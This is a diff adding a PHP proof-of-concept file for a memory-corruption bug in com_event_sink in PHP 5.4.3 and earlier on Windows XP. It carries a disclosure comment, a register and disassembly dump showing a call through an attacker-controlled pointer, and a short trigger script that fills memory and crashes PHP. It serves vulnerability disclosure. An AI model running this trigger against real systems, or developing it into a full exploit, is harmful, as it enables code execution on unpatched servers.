@@ -1,0 +1,55 @@
+<?php 
+
+/*
+
+PHP <= 5.4.3 (com_event_sink) Code Execution Proof of Concept
+Found by condis
+Website: http://cond.psychodela.pl
+
+Tested on:
+	
+	PHP 5.3.8  + Windows XP SP3 Professional PL
+	PHP 5.3.10 + Windows XP SP3 Professional PL
+	PHP 5.4.0  + Windows XP SP3 Professional PL
+	PHP 5.4.3  + Windows XP SP3 Professional PL
+	
+Description:
+
+	This is a very strange bug and I had a really hard time trying to classify
+	it, but lets start from the beginning. 
+	
+	As we can read in PHP manual : com_event_sink function connects events from 
+	COM object to a PHP object. First argument should be a COM object. But when
+	I set it up to new Variant(), PHP instance crashed. 
+	
+	After few minutes of research it was clear to me that we can control EAX 
+	register by defining first parameter of our Variant object.
+
+	The proof of concept code located below should produce situation similar to
+	this :
+
+	eax=024e0050 ebx=010328f0 ecx=41414141 edx=00c0facc esi=0121ff68 edi=00000000
+	eip=100f33d5 esp=00c0faa8 ebp=00000000 iopl=0         nv up ei pl nz na po nc
+	cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
+
+	100f33d4 50              push    eax
+	100f33d5 8b01            mov     eax,dword ptr [ecx]  ds:0023:41414141=????????
+	100f33d7 ffd0            call    eax
+
+	IMHO it is possible to write a reliable exploit using i.e.: ROP method but due 
+	to lack of free time and skill I leave this task to someone else. Also 0in tried 
+	to write stable exploit for same bug in com_print_typeinfo() function but as far 
+	as I know it isn't stable enough :( 
+
+
+Greetz: cxib, 0in, and others ;> 
+
+*/
+
+$EAX   = 0x024E0050; 			// stack starts at 0x024E0050 (in my case)
+$stack = str_repeat("x41", 0x1000000);	// putting some garbage on the stack so the ECX would be 41414141
+
+class foo { }
+com_event_sink(new Variant($EAX), new foo(), array());	
+
+?>
